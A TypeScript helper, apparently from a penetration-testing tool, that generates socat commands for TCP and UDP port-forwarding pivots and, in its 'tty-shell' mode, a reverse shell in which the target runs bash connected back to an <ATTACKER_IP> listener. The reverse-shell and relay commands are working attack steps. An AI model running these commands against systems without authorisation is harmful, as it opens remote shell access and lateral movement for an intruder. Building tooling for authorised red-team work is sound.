import { SocatPivot } from "@/app/hooks/useSocatPivot";
import { PivotCommands } from "@/app/types/tool";

export function resolvePivotCommands(pivot: SocatPivot): PivotCommands {
  const cmds: PivotCommands = { attacker: [], target: [] };
  let step = 1;

  const targetIP = pivot.targetIP?.trim() ? pivot.targetIP : "<TARGET_IP>";
  const attackerIP = pivot.attackerIP?.trim() ? pivot.attackerIP : "<ATTACKER_IP>";

  if (pivot.mode === "tcp-forward") {
    cmds.target.push({
      step: step++,
      command: `socat TCP-LISTEN:${pivot.listenPort},fork TCP:${targetIP}:${pivot.targetPort}`,
    });
    cmds.attacker.push({
      step: step++,
      command: `# Traffic arriving at the relay host on port ${pivot.listenPort} will be forwarded to ${targetIP}:${pivot.targetPort}`,
    });
  } else if (pivot.mode === "udp-forward") {
    cmds.target.push({
      step: step++,
      command: `socat UDP-LISTEN:${pivot.listenPort},fork UDP:${targetIP}:${pivot.targetPort}`,
    });
    cmds.attacker.push({
      step: step++,
      command: `# UDP traffic arriving at the relay host on port ${pivot.listenPort} will be forwarded to ${targetIP}:${pivot.targetPort}`,
    });
  } else if (pivot.mode === "tty-shell") {
    cmds.attacker.push({
      step: step++,
      command: `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${pivot.listenPort}`,
    });
    cmds.target.push({
      step: step++,
      command: `socat exec:'bash -li',pty,stderr,sane TCP:${attackerIP}:${pivot.listenPort}`,
    });
  }

  return cmds;
}
